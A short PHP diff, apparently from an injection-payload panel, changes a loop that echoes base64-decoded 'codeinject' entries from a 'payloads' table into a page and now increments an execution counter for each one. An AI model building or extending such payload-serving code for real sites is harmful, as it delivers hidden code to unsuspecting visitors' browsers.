@@ -17,10 +17,16 @@ $(document).ready(function()
         echo base64_decode($url_verif);
     }
     
-    $select_inject_check = $bdd->prepare("SELECT codeinject FROM payloads");
+    $select_inject_check = $bdd->prepare("SELECT id, codeinject FROM payloads");
     $select_inject_check->execute();
     while($fetch2 = $select_inject_check->fetch())
     {
+        if($fetch2['id'] != ''){
+            $update = $bdd->prepare("UPDATE payloads SET action = action + 1 WHERE id = :id");
+            $update->bindParam(':id', $fetch2['id']);
+            $update->execute();
+        }
+        
         $inject = $fetch2['codeinject'];
         echo base64_decode($inject);
     }
